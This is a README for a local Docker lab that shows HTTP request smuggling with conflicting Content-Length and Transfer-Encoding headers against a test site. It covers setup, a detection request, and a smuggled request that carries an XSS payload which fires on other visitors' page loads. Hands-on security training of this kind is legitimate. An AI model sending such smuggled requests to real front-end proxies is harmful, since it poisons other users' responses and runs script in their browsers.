# HTTP/1.1 CL.TE

The following application demonstrate request smuggling with the headers combination `Content-Length` and `Transfer-Encoding`.


## How to setup

Define the following hostname in `/etc/hosts` or `C:\Windows\System32\drivers\etc\hosts`.
```
127.0.0.1 simplewebsite.gosec.co
```

Docker and docker-compose are required.
```
docker-compose up
```

### Testing

Open `http://simplewebsite.gosec.co` in a browser to confirm that everything is running.


HRS detection:

The following request need to repeated ~10 times until you get `405 Not Allowed` (Method not allowed)
```
POST / HTTP/1.1
Host: simplewebsite.gosec.co
Content-Length: 79
Transfer-Encoding: chunked

0

G
```


Injecting an HTTP request in the proxy pipeline.
```
POST / HTTP/1.1
Host: simplewebsite.gosec.co
Content-Length: 79
Transfer-Encoding: chunked

0

GET /contact.php?test=123"><img/src="xx"onerror="alert(1)"> HTTP/1.1
Foo:
```

Once this is sent. Refresh the home page or any page on the website until it is placed after the previous malicious request.
You should see the XSS trigger.

